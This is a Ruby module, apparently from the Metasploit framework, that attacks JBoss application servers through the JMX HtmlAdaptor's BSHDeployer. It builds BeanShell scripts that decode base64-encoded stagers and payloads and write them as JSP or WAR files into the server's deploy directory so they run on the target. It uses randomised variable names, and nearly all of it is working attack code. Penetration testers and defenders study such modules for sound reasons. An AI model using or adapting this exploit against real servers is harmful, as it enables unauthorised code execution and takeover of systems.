# -*- coding: binary -*-
module Msf::HTTP::JBoss::BSH

  def deploy_bsh(bsh_script)
    if datastore['PACKAGE'] == 'auto'
      packages = %w{ deployer scripts }
    else
      packages = [ datastore['PACKAGE'] ]
    end

    success = false
    packages.each do |p|
      print_status("Attempting to use '#{p}' as package")
      res = invoke_bshscript(bsh_script, p)
      if !res
        fail_with(Failure::Unknown, "Unable to deploy WAR [No Response]")
      end

    if (res.code < 200 || res.code >= 300)
      case res.code
        when 401
          print_warning("Warning: The web site asked for authentication: #{res.headers['WWW-Authenticate'] || res.headers['Authentication']}")
          fail_with(Failure::NoAccess, "Authentication requested: #{res.headers['WWW-Authenticate'] || res.headers['Authentication']}")
        end

        print_error("Upload to deploy WAR [#{res.code} #{res.message}]")
        fail_with(Failure::Unknown, "Invalid reply: #{res.code} #{res.message}")
      else
        success = true
        @pkg = p
        break
      end
    end

    if not success
      fail_with(Failure::Unknown, "Failed to deploy the WAR payload")
    end
  end

  def deploy_stager_bsh(encoded_stager_code, stager_base, stager_jsp_name)

    jsp_file_var = rand_text_alpha(8+rand(8))
    jboss_home_var = rand_text_alpha(8+rand(8))
    fstream_var = rand_text_alpha(8+rand(8))
    byteval_var = rand_text_alpha(8+rand(8))
    stager_var = rand_text_alpha(8+rand(8))
    decoder_var = rand_text_alpha(8+rand(8))

    # The following Beanshell script will write a short stager application into the deploy
    # directory. This stager script is then used to install the payload
    #
    # This is neccessary to overcome the size limit for GET/HEAD requests
    stager_bsh_script = <<-EOT
import java.io.FileOutputStream;
import sun.misc.BASE64Decoder;

String #{stager_var} = "#{encoded_stager_code}";

BASE64Decoder #{decoder_var} = new BASE64Decoder();
String #{jboss_home_var} = System.getProperty("jboss.server.home.dir");
new File(#{jboss_home_var} + "/deploy/#{stager_base + '.war'}").mkdir();
byte[] #{byteval_var} = #{decoder_var}.decodeBuffer(#{stager_var});
String #{jsp_file_var} = #{jboss_home_var} + "/deploy/#{stager_base + '.war/' + stager_jsp_name + '.jsp'}";
FileOutputStream #{fstream_var} = new FileOutputStream(#{jsp_file_var});
#{fstream_var}.write(#{byteval_var});
#{fstream_var}.close();
EOT
    print_status("Creating exploded WAR in deploy/#{stager_base}.war/ dir via BSHDeployer")
    deploy_bsh(stager_bsh_script)
  end

  def deploy_payload_bsh(encoded_payload, app_base)

    # The following Beanshell script will write the exploded WAR file to the deploy/
    # directory
    payload_bsh_script = <<-EOT
import java.io.FileOutputStream;
import sun.misc.BASE64Decoder;

String val = "#{encoded_payload}";

BASE64Decoder decoder = new BASE64Decoder();
String jboss_home = System.getProperty("jboss.server.home.dir");
byte[] byteval = decoder.decodeBuffer(val);
String war_file = jboss_home + "/deploy/#{app_base + '.war'}";
FileOutputStream fstream = new FileOutputStream(war_file);
fstream.write(byteval);
fstream.close();
EOT

    print_status("Creating exploded WAR in deploy/#{app_base}.war/ dir via BSHDeployer")
    deploy_bsh(payload_bsh_script)

  end

  # Invokes +bsh_script+ on the JBoss AS via BSHDeployer
  def invoke_bshscript(bsh_script, pkg)
    params =  'action=invokeOpByName'
    params << '&name=jboss.' + pkg + ':service=BSHDeployer'
    params << '&methodName=createScriptDeployment'
    params << '&argType=java.lang.String'
    params << '&arg0=' + Rex::Text.uri_encode(bsh_script)
    params << '&argType=java.lang.String'
    params << '&arg1=' + rand_text_alphanumeric(8+rand(8)) + '.bsh'
    if (datastore['VERB']== "POST")
      res = send_request_cgi({
        'method'	=> datastore['VERB'],
        'uri'		=> normalize_uri(datastore['PATH'], '/HtmlAdaptor'),
        'data'	=> params
      })
    else
      res = send_request_cgi({
        'method'	=> datastore['VERB'],
        'uri'		=> normalize_uri(datastore['PATH'], '/HtmlAdaptor') + "?#{params}"
      }, 30)
    end
    res
  end
end
